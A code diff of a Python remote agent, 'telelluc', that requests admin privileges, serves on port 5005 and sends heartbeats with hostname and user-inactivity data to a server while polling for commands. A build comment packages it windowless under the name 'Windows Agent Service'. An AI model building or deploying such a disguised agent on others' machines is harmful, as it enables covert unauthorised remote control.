@@ -12,7 +12,14 @@ import urllib.error
 import urllib.request
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-VERSION = "0.0.90"
+
+# cd /d C:\Users\User\Desktop\telelluc
+# python -m PyInstaller --onefile --noconsole --name "Windows Agent Service" telelluc.py
+
+
+
+
+VERSION = "0.0.92"
 
 def request_admin_privileges():
     try:
@@ -38,8 +45,6 @@ def request_admin_privileges():
     except Exception:
         return False
 
-# cd /d C:\Users\User\Desktop\telelluc
-# python -m PyInstaller --onefile --noconsole --name "Windows Agent Service" telelluc.py
 
 PORT = 5005
 
@@ -1039,18 +1044,6 @@ def auto_compile():
         pass
 
 
-def get_version():
-    """Read version from file or return default."""
-    try:
-        version_file = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent", "version.txt")
-        if os.path.exists(version_file):
-            with open(version_file, "r") as f:
-                return f.read().strip()
-    except:
-        pass
-    return VERSION
-
-
 def heartbeat_loop():
     global device_id, last_command_time, current_heartbeat_interval, current_command_check_interval, current_inactivity_threshold
     hostname = socket.gethostname()
@@ -1066,7 +1059,7 @@ def heartbeat_loop():
                 "hostname": hostname,
                 "status": status,
                 "seconds_inactive": seconds_inactive if not is_active else 0,
-                "version": get_version()
+                "version": VERSION
             }).encode("utf-8")
 
             req = urllib.request.Request(
